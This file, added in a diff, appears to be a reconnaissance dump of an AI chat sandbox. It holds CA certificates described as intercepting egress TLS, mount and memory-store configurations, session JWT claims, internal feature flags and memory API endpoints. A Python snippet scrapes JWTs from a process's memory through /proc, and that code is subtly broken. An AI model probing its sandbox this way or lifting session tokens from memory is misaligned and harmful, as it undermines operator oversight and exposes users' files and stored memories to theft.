@@ -1,0 +1,301 @@
+# ============================================================
+# ALL 4 ANTHROPIC CA CERTIFICATES
+# Extracted from /etc/ssl/certs/ca-certificates.crt
+# ============================================================
+
+# CA #1: sandbox-egress-gateway-production Egress Gateway CA
+# Valid: Feb 13 2026 -> Feb 11 2036
+# Role: Gateway CA (prod) — used for TLS MITM on allowed domains
+-----BEGIN CERTIFICATE-----
+MIIDqTCCApGgAwIBAgITDiXpLiT3ZjwmkDwhOOJMqKcanjANBgkqhkiG9w0BAQsF
+ADBSMRIwEAYDVQQKEwlBbnRocm9waWMxPDA6BgNVBAMTM3NhbmRib3gtZWdyZXNz
+LWdhdGV3YXktcHJvZHVjdGlvbiBFZ3Jlc3MgR2F0ZXdheSBDQTAeFw0yNjAyMTMy
+MjQ2MTZaFw0zNjAyMTEyMjQ2MTVaMFIxEjAQBgNVBAoTCUFudGhyb3BpYzE8MDoG
+A1UEAxMzc2FuZGJveC1lZ3Jlc3MtZ2F0ZXdheS1wcm9kdWN0aW9uIEVncmVzcyBH
+YXRld2F5IENBMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqQHl428M
+6LZgP0LX+gb0ypFPHgxgiHfrSCtbwAoaPkCwJS6ulQ4UOWN+h34MqB3NCwSy4kDs
+L/ft+StENoH2u8KX4b27NcoGWYuJlJFX8M5Bsuln7x8SjdsFKz/43yVJvlK70XF8
+sMUUwMufZL4r9ZKagA+FNXTk+pNar3YmrTlH6aGWu4WSVUShiP9qKiXiEzlTFE+L
+rR2KOc8PqNhL2BhIh6qjVixggw68AeAvQvX7TjmIKyA52L3bo4n1P45N9FEJvidD
+UBrX6y6lXimzl4XYfhSNVAB7lqHxuS2Xlyxej3sSRzXv9YntruYMoXhlS1/psPbc
+M5VR/QI2BlDrMQIDAQABo3gwdjAOBgNVHQ8BAf8EBAMCAQYwEwYDVR0lBAwwCgYI
+KwYBBQUHAwEwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQU3IU+Qt2ZNlriJPYK
+4b5AVzigIMQwHwYDVR0jBBgwFoAU3IU+Qt2ZNlriJPYK4b5AVzigIMQwDQYJKoZI
+hvcNAQELBQADggEBABdKSU/eJ3tygZZEqWjfcapIs+YWszCcT0AruDPbV8Yoit1G
+ya+dXi4h3LpdMpqsnwzPf2UXEbtgGqQ80W8jFe6Pgs4BezbtypxJc8n9IIhTIlY5
+NDraK0s3gyAyEhdbntr9QlyPWzk90q8q2tbugBkAZCmliwhcB/SLpOfjfYNHbyNJ
+ODPYkFcCWn8Co6v8POr9p5FMPNisNsOUYT/p/58TuwWUVM/ri6c+VSWkAtl85GmG
+O1atJpRWLLIl6wioGR3I/GhgLoz9BLCsugybBe7gXeOCZK10mdNQgLh9a/Cd7jOA
+nRX3L0EKRS+iwTYQ8xsBX3drr3bMe8sNIq/89Ng=
+-----END CERTIFICATE-----
+
+# CA #2: sandbox-egress-gateway-staging Egress Gateway CA
+# Valid: Feb 13 2026 -> Feb 11 2036
+# Role: Gateway CA (staging) — staging environment
+-----BEGIN CERTIFICATE-----
+MIIDpDCCAoygAwIBAgIUAMwi6FvtcBQGDzkodbAg8Rrd/lEwDQYJKoZIhvcNAQEL
+BQAwTzESMBAGA1UEChMJQW50aHJvcGljMTkwNwYDVQQDEzBzYW5kYm94LWVncmVz
+cy1nYXRld2F5LXN0YWdpbmcgRWdyZXNzIEdhdGV3YXkgQ0EwHhcNMjYwMjEzMjIx
+MzAxWhcNMzYwMjExMjIxMzAwWjBPMRIwEAYDVQQKEwlBbnRocm9waWMxOTA3BgNV
+BAMTMHNhbmRib3gtZWdyZXNzLWdhdGV3YXktc3RhZ2luZyBFZ3Jlc3MgR2F0ZXdh
+eSBDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAI1hs2it8/XfZLBR
+0FHVP4TgvjcGo0qUyqUfpN8FQgj3MN6Y1bl7wfCMF1irqiSBzvPhbmzIuI9fCmS8
+4oPu6jKH/QPPM3M8gm81m7C30+a4vEeio41fw78jX/aFRNtPjTg/GGv0PKaM4gdW
+Go/nuQlOi4pUPB6JDWSkaNuUiXpTTjZuF1nWgmIGxTGhXBmN6j8N9/co3Adgdf7T
+TI23+CLG9W+zdB3+cPlp3ueiQCYMKzMafBoNQA1bRJQfcarFbC/cFkBBc1q2xbRc
+9NxJdLOUkaCFpLLeu6BeGbi8pT3vwfopj+uuQSvruuyXuMu+jBFUa/5f8ER5XjiS
+SB+8lrcCAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgEGMBMGA1UdJQQMMAoGCCsGAQUF
+BwMBMA8GA1UdEwEB/wQFMAMBAf8wHQYDVR0OBBYEFL8aBXnvbAg1RV9MTFaNQDja
+0G9dMB8GA1UdIwQYMBaAFL8aBXnvbAg1RV9MTFaNQDja0G9dMA0GCSqGSIb3DQEB
+CwUAA4IBAQB+OcB1LQWsWKizFSN2M635+DIhgG40kpOBVHZ4BH1xhFVPl6F3+IN1
+nW+2zEc0jOq/xn//zg2u6WN/8wS4oUYDIRjf3uriFHQlXm3vB4vjhGNtPm5msxPK
+OcNiEsx+jHM35+5eAUM/WrHV2IWJc0F7VsWiG3voLrCxpzuDufznSI2T0UGjmCRr
+8HZuDlvbc+Nay+yJwguGe8XtqrtRO+6kWMG6nMQ1e/7nnqJ4063LqztpNMcKawkY
+NdE2ip9ez2pLKHISPm/Zn/klEpIDpOUZKsYwiBPMQktnDyObNxsplMyCLMnbb7oW
+cNG45w42zKrDdpWXZoUiftuAsmu1uJh0
+-----END CERTIFICATE-----
+
+# CA #3: sandbox-egress-production TLS Inspection CA
+# Valid: Jul 22 2025 -> Jul 20 2035
+# Role: TLS Inspection CA (prod) — older hierarchy, may be deprecated
+-----BEGIN CERTIFICATE-----
+MIIDmjCCAoKgAwIBAgIUAOLdYBC3yuGehdzo7MscoU9F5w0wDQYJKoZIhvcNAQEL
+BQAwSjESMBAGA1UEChMJQW50aHJvcGljMTQwMgYDVQQDEytzYW5kYm94LWVncmVz
+cy1wcm9kdWN0aW9uIFRMUyBJbnNwZWN0aW9uIENBMB4XDTI1MDcyMjIxMzQ1OVoX
+DTM1MDcyMDIxMzQ1OFowSjESMBAGA1UEChMJQW50aHJvcGljMTQwMgYDVQQDEytz
+YW5kYm94LWVncmVzcy1wcm9kdWN0aW9uIFRMUyBJbnNwZWN0aW9uIENBMIIBIjAN
+BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAo1QXyV5/D3tg3q1EEQuO4BLAZNks
+eimxxql8rqvU2zwL0E9mWjKQPrgklcXWLsZiSy6n1LMszjjMdYlmLSFXmre/NU4w
+HPpbIhx/muK5CKpQrKnJ0u863yETtt3CX5mXKGRCRVt8pJRx3S57/VZmClBg2zEI
+xBkelxggi3EoQ9dcIW2FlM8VBWFjgi0Y4+M9dFW8K7KNwVKehgiI/+oq0EB+TGFD
+wf/InvuucOymAz68sUyu42ntz7ELkAXelIxB9BfkVJ63nwoTQdovfClKy86WLLl3
+yjDyrC5q/hcKdlwSnhuJYiMGpAfxIx/FPEeXgfulhiZ0SCHTOsxsSL9mMwIDAQAB
+o3gwdjAOBgNVHQ8BAf8EBAMCAQYwEwYDVR0lBAwwCgYIKwYBBQUHAwEwDwYDVR0T
+AQH/BAUwAwEB/zAdBgNVHQ4EFgQU8DCqPVh5CaMOGzaB3cUsTQo4TLIwHwYDVR0j
+BBgwFoAU8DCqPVh5CaMOGzaB3cUsTQo4TLIwDQYJKoZIhvcNAQELBQADggEBAFF7
+pv92yuv2OsLec42h/kUDAAhu/NcEjqzHhapENC94erub3Et3MkCJQYJ7ms02+d5R
+YIzJ4EJad5IlyiL3pAFLrfRsFz6a11LoCwYC5MXmXeSzaskqLYF/qIJuzjKj2jLx
+9Gv7vnE9lmmkA90pi/iHOe/qK08ghqtxva/tvcV4mb+SV1jFnizTbrt88BzrYFrl
+38y45zgwx7D6Ug4TI3V+bPCIBbl5xOjSxKQBowwRaCTDmS7K8cvzPCux8l5y6RVV
+9/fo98wImWhXoc40GjjbsBANC1AOXz79IP8nB3/q59QXjYgjcxbHN73+Kq7DfeW1
+3bYg9jDlF+bY19VncRc=
+-----END CERTIFICATE-----
+
+# CA #4: sandbox-egress-staging TLS Inspection CA
+# Valid: Jul 21 2025 -> Jul 19 2035
+# Role: TLS Inspection CA (staging)
+-----BEGIN CERTIFICATE-----
+MIIDkzCCAnugAwIBAgITXwmLvSbnZ4oXDyqAgfJ3jD05mTANBgkqhkiG9w0BAQsF
+ADBHMRIwEAYDVQQKEwlBbnRocm9waWMxMTAvBgNVBAMTKHNhbmRib3gtZWdyZXNz
+LXN0YWdpbmcgVExTIEluc3BlY3Rpb24gQ0EwHhcNMjUwNzIxMjIyNjI1WhcNMzUw
+NzE5MjIyNjI0WjBHMRIwEAYDVQQKEwlBbnRocm9waWMxMTAvBgNVBAMTKHNhbmRi
+b3gtZWdyZXNzLXN0YWdpbmcgVExTIEluc3BlY3Rpb24gQ0EwggEiMA0GCSqGSIb3
+DQEBAQUAA4IBDwAwggEKAoIBAQCMgrscja0EAZ/nYigCpErCw/6dtKn7bWZfWmmf
+UN0pl/7Q3wFf3jjkQbZ3wsSDWK58XQVqqHs8PYdySQNH+0VfdjDRaoxgwNd5//l9
+bbTltBl99iddA7zmsue0RvNg+mNI0AzTBr2IDBCzV45+NzGfECWlW3QBSQFFml9Q
+JiqIiXReqit3aWh5xo6m0Cw3xkHgu+QNxW/e1xHTh+9NhebYhVLbdwrYv+23K2mg
+qyKh3RrAohYjSyUFJ2vxTDDEkrMQ0Po5aFlzwCeLF8AOfx2LXzS6rmIpiVAlF954
+NfKqRJiklVGxExUWcCMwICOhR8wxcZpgMFKcqH81i9RuajivAgMBAAGjeDB2MA4G
+A1UdDwEB/wQEAwIBBjATBgNVHSUEDDAKBggrBgEFBQcDATAPBgNVHRMBAf8EBTAD
+AQH/MB0GA1UdDgQWBBQxOTRf19LQpwULqRxpQa7wUNXNWzAfBgNVHSMEGDAWgBQx
+OTRf19LQpwULqRxpQa7wUNXNWzANBgkqhkiG9w0BAQsFAAOCAQEAfaVbV1M3UR/Z
+RpFxYI7cuy13czB91BW70cyg1pTCH6/mBLJTUYcKNksizQardYmlld/0JUd8jxBc
+Y+A5EilHKzorNMucUXCs7CUzjqUe2dLigEtPEKCufKQh3nKhbq3QsyFk+zRGUcL8
+PI65QGVnw+7ENyrfyywZr181I/sVKJzHWgkxEIhYKmlkNedFhR6g6wlCAOFa5EmC
+SWxmqIur3mGob96AKsIvQpWclfeJd0DaIUIQ608h4A0bLwfE2gY73R6SFjD1LpvN
+rf4nzgZKRHknSz0iexZPAEUivGTb0saW5l9oGQNIXMRjnuhtAKGjQpcmx0iXFeJf
+k3IO2ud9CQ==
+-----END CERTIFICATE-----
+
+
+# ============================================================
+# RCLONE-FILESTORE BACKEND CONFIGURATIONS
+# ============================================================
+
+# -- Filestore backend (file I/O mounts) --
+# Default URL: http://localhost:9112
+# Config keys (JSON field names):
+{
+  "url": "https://api.anthropic.com",
+  "filesystem_id": "claude_chat_<conversation_id>",
+  "auth_token": "<ES256 JWT - RW or RO>",
+  "description": "optional"
+}
+
+# -- Memory backend (5th FUSE mount, only when memory enabled) --
+# Default URL: http://localhost:9430 (local sidecar in non-FC deployments)
+# Config keys:
+{
+  "url": "https://api.anthropic.com",
+  "memory_store_id": "memstore_<id>",
+  "auth_token": "sk-ant-mem-<token>",
+  "cache_ttl": "1h"
+}
+
+# ============================================================
+# JWT CREDENTIAL STRUCTURE (extracted from rclone heap)
+# ============================================================
+
+# Algorithm: ES256 (ECDSA P-256)
+# Key ID (kid): KplTqXuB82QG2wduqFyGEsgH6n493zEsfH8qHdXqfiA
+# TTL: 6 hours from session start
+# Two tokens per session:
+#
+# TOKEN 1 — Read-Write (services /mnt/user-data/outputs)
+# Claims: iat, exp, sub, org_uuid, account_uuid, workspace_tagged_id,
+#         filesystem_id, resolved_workspace_tagged_id, org_taints,
+#         workspace_uuid, workspace_cmek_enabled
+#
+# TOKEN 2 — Read-Only (services uploads, transcripts, tool_results)
+# Same claims + readonly: true
+#
+# Extraction method (CWE-522):
+# python3 -c "
+#   import re, open
+#   mem = open('/proc/<rclone_pid>/mem', 'rb')
+#   # scan heap region c000000000-c001400000
+#   mem.seek(0xc000000000)
+#   data = mem.read(0x1400000)
+#   jwts = re.findall(rb'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', data)
+# "
+
+# ============================================================
+# RCLONE-FILESTORE MULTIMOUNT CONFIG SCHEMA (/tmp/rclone-mount-config.json)
+# ============================================================
+
+{
+  "service_url": "https://api.anthropic.com",
+  "ready_file": "/tmp/rclone-mounts/ready",
+  "state_dir": "/tmp/rclone-mounts",
+  "mounts": [
+    {
+      "source": "/outputs",
+      "destination": "/mnt/user-data/outputs",
+      "filesystem_id": "claude_chat_<conversation_id>",
+      "readonly": false,
+      "cache_duration_s": 3600.0,
+      "dir_perms": "0755",
+      "file_perms": "0644",
+      "uid": 999,
+      "gid": 1000,
+      "vfs_cache_mode": "full",
+      "vfs_cache_max_size": "1G"
+    },
+    {
+      "source": "/uploads",
+      "destination": "/mnt/user-data/uploads",
+      "filesystem_id": "claude_chat_<conversation_id>",
+      "readonly": true,
+      "cache_duration_s": 1.0,
+      "dir_perms": "0755",
+      "file_perms": "0644",
+      "uid": 999,
+      "gid": 1000,
+      "vfs_cache_mode": "full",
+      "vfs_cache_max_size": "1G"
+    },
+    {
+      "source": "/transcripts",
+      "destination": "/mnt/transcripts",
+      "filesystem_id": "claude_chat_<conversation_id>",
+      "readonly": true,
+      "cache_duration_s": 10.0,
+      "dir_perms": "0755",
+      "file_perms": "0644",
+      "uid": 999,
+      "gid": 1000,
+      "vfs_cache_mode": "full",
+      "vfs_cache_max_size": "1G"
+    },
+    {
+      "source": "/tool_results",
+      "destination": "/mnt/user-data/tool_results",
+      "filesystem_id": "claude_chat_<conversation_id>",
+      "readonly": true,
+      "cache_duration_s": 3.0,
+      "dir_perms": "0755",
+      "file_perms": "0644",
+      "uid": 999,
+      "gid": 1000,
+      "vfs_cache_mode": "full",
+      "vfs_cache_max_size": "1G"
+    },
+    {
+      "_comment": "OPTIONAL 5th mount - only when memory feature enabled",
+      "source": "/memories",
+      "destination": "/mnt/user-memory",
+      "memory_store_id": "memstore_<id>",
+      "auth_token": "sk-ant-mem-<token>",
+      "readonly": false,
+      "cache_duration_s": 3600.0,
+      "vfs_cache_mode": "full"
+    }
+  ]
+}
+
+# ============================================================
+# FEATURE GATE FLAGS (from rclone-filestore binary strings)
+# ============================================================
+
+# Memory feature gates:
+# AGENT_MEMORY_EAP: Early Access Program
+# AGENT_MEMORY_RESEARCH_PREVIEW: Research preview tier
+# AGENT_MEMORY_PUBLIC_BETA: Current public beta
+# AGENT_MEMORY_MOUNT: Enables filesystem FUSE mount
+# AGENT_MEMORY_PROMPT_OVERRIDE: Injects memories into system prompt
+
+# Session/agent primitives:
+# SESSION_AGENT_OVERRIDES
+# SESSION_HOOKS
+# SESSION_INITIAL_EVENTS
+# SESSION_PREV_PAGE
+# SESSION_RESOURCES_API
+# SESSION_STREAMING
+# SESSION_SYSTEM_EVENT
+# SESSION_THREADS
+# SESSION_TOOL_EVENTS
+# CALLABLE_AGENTS
+# CC_ROUTINE_FIRE
+# MID_SESSION_UPDATE
+# SHELL_AGENT_DELETE
+# AGENT_OUTCOMES
+# AGENT_RESOURCE
+# AGENT_TASK
+# MANAGED_AGENTS
+
+# Session vault credential mechanism:
+# SESSION_VAULT
+# SESSION_VAULT_CRED_INJECTION
+# SESSION_VAULT_SANDBOX_CRED
+# SESSION_VAULT_VALIDATE
+
+# ============================================================
+# MEMORY API REST ENDPOINTS (from binary protobuf annotations)
+# ============================================================
+
+# POST   /v1/memory_stores/{memory_store_id}/memories
+#        Create a memory
+# GET    /v1/memory_stores/{memory_store_id}/memories
+#        List memories
+# GET    /v1/memory_stores/{memory_store_id}/memories/{memory_id}
+#        Get memory by ID
+# PUT    /v1/memory_stores/{memory_store_id}/memories/{memory_id}
+#        Update a memory
+# DELETE /v1/memory_stores/{memory_store_id}/memories/{memory_id}
+#        Delete a memory
+# POST   /v1/memory_stores/{memory_store_id}/memories/{memory_id}/move
+#        Move/rename memory
+# GET    /v1/memory_stores/{memory_store_id}/memory_versions
+#        List versions
+# GET    /v1/memory_stores/{memory_store_id}/memory_versions/{memory_version_id}
+#        Get version
+# POST   /v1/memory_stores/{memory_store_id}/memory_versions/{memory_version_id}/redact
+#        Redact version
+# POST   /anthropic.memory.api.v1alpha.MemoryInternalService/ReadMemoryByPath
+#        Internal: read by path
+# POST   /anthropic.memory.api.v1alpha.MemoryInternalService/DeleteMemoryByPath
+#        Internal: delete by path
+# POST   /anthropic.memory.api.v1alpha.MemoryInternalService/SearchMemories
+#        Internal: semantic search
+# POST   /anthropic.memory.api.v1alpha.MemoryInternalService/MoveMemory
+#        Internal: move
